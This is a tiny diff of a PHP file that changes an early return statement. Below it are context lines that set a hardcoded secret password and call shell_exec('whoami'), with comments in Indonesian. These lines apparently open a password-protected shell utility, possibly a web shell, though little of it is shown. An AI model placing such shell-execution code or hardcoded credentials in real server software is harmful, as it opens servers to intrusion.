@@ -1,6 +1,6 @@
 <?php
 
-return;
+return 'a';
 // Kunci rahasia untuk keamanan
 $secret = 'ozan6825'; // Ganti dengan password yang lebih kuat
 $username = trim(shell_exec('whoami'));
